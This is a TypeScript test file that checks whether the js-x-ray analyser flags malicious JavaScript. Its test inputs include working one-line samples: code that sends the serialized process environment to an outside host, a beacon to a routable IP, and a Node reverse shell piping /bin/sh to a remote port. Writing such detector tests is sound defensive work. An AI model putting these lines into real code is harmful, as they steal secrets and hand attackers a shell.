import assert from "node:assert/strict"
import { test } from "node:test"
import { AstAnalyser } from "@nodesecure/js-x-ray"

/**
 * What js-x-ray is here for, asserted against real payloads rather than taken
 * on trust. These are the attacks a single diff line cannot describe: the
 * pattern is spread across a call, so no `added_lines` regex sees it whole.
 */
const analyse = async (source: string) =>
  (await new AstAnalyser().analyse(source)).warnings.map((w) => w.kind)

test("the environment being packaged for sending is caught", async () => {
  assert.ok(
    (await analyse(`fetch("https://x.tld", { body: JSON.stringify(process.env) })`)).includes(
      "serialize-environment",
    ),
  )
})

test("a beacon pointed at a routable IP is caught", async () => {
  const kinds = await analyse(`const a=require("axios");a.post("http://185.220.101.5/x",{})`)
  assert.ok(kinds.includes("shady-link"))
})

test("a reverse shell is caught", async () => {
  const kinds = await analyse(
    `const n=require("net"),c=require("child_process");const s=n.connect(4444,"10.0.0.1");c.spawn("/bin/sh").stdout.pipe(s)`,
  )
  assert.ok(kinds.length > 0, "a reverse shell produced no warning at all")
})

test("ordinary code produces nothing", async () => {
  assert.deepEqual(await analyse(`export function add(a, b) { return a + b }`), [])
  assert.deepEqual(await analyse(`const port = process.env.PORT ?? 3000`), [])
})

test("a diff fragment throws, which is why whole files are fetched", async () => {
  // The reason lib/xray.ts reads whole files instead of using the added lines
  // it already has. If this ever stops throwing, that per-file fetch can go.
  // Thrown synchronously, before the promise exists, so assert.rejects does not
  // see it.
  let threw = false
  try {
    await new AstAnalyser().analyse(`  fetch(x)\n  if (y) {`)
  } catch {
    threw = true
  }
  assert.ok(threw, "a fragment parsed cleanly; whole-file fetching may be unnecessary")
})
